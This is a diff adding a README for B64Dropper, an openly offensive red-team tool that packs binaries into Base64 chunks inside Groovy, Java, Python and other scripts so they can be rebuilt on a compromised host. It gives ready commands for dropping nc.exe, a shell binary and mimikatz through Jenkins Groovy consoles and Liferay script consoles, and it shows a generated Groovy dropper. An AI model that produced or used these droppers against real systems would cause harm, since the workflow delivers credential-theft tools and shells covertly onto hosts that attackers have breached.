@@ -1,0 +1,80 @@
+# B64Dropper
+
+## Description
+
+B64Dropper facilitates **Living off the Land (LotL)** by converting binaries into polyglot scripts (Java, Python, Bash, etc.) with embedded Base64 payloads. It enables stealthy payload delivery using only standard libraries, bypassing the need for external transfer tools or outbound connections.
+In simpler terms, this is useful when you have access to script consoles or features that allow programmatic interaction with the host, but are limited to basic shell commands. It allows you to transfer binaries/redteam tools through standard script code (like Java or Python) to reconstruct the executable on the target.
+
+## History
+
+This tool was originally developed as a Proof of Concept (POC) to exploit vulnerabilities in complex enterprise environments where standard reverse shells were difficult to stabilize or upload. Notable initial targets included:
+
+- **ShellBeans**: Exploiting Java deserialization or command injection flaws where only blind execution was available.
+- **Jenkins**: Leveraging Groovy script console or agent execution to drop tooling on build nodes.
+- **Liferay**: Used in POCs targeting Liferay portal script console to drop bindshells
+
+## Usage & POCs
+
+Generate a dropper for a small tool (e.g., `nc.exe`) to be executed via a Python interpreter on the target:
+
+```bash
+python3 b64dropper.py nc.exe -l python -f nc.exe -o deploy_nc.py
+```
+
+When delivering larger binaries (like `mimikatz`, `winpeas`, or C2 agents), script interpreters often have limits on string literal lengths. B64Dropper automatically handles this by splitting the payload into chunks (default 6000 chars).
+
+**Scenario**: Deploying a refined generic shell to a Liferay instance via Java.
+
+```bash
+
+python3 b64dropper.py shell.elf -l java -f /tmp/shell -o Dropper.java
+```
+
+**Scenario**: Dropping a static `mimikatz` binary to a Jenkins Groovy Console.
+
+```bash
+# generate a mimikatz dropper Groovy script
+python3 b64dropper.py path/to/mimikatz -l groovy -f /tmp/mimikatz -o build_mimikatz.groovy -s 4000
+```
+
+_The `-s 4000` flag ensures chunks fit comfortably within Groovy's string handling limits._
+
+### Output: `build_mimikatz.groovy`
+
+```groovy
+// Decodes base64 chunks and writes to file
+def chunks = [
+    "TVqQAAMAAAAEAAAA//8AALgAAA...",
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAA..."
+]
+
+File file = new File("/tmp/mimikatz")
+file.withOutputStream { out ->
+    chunks.each { chunk ->
+        out.write(Base64.decoder.decode(chunk))
+    }
+```
+
+## Help
+
+```text
+usage: b64dropper.py [-h] [-l {groovy,java,js,python,powershell,bash,go,csharp,cpp}] [-o OUTPUT]
+                     [-f FILENAME] [-s CHUNK_SIZE]
+                     input_file
+
+Convert a binary file to a base64 dropper script in various languages.
+
+positional arguments:
+  input_file            Path to the input binary file (e.g. tool.exe)
+
+options:
+  -h, --help            show this help message and exit
+  -l {groovy,java,js,python,powershell,bash,go,csharp,cpp}, --language {groovy,java,js,python,powershell,bash,go,csharp,cpp}
+                        Target programming language for the dropper script
+  -o OUTPUT, --output OUTPUT
+                        Output file (for script) or directory (for legacy chunks)
+  -f FILENAME, --filename FILENAME
+                        Name of the file to be created on the target system (used in script mode)
+  -s CHUNK_SIZE, --chunk-size CHUNK_SIZE
+                        Length of each chunk string (default: 6000)
+```
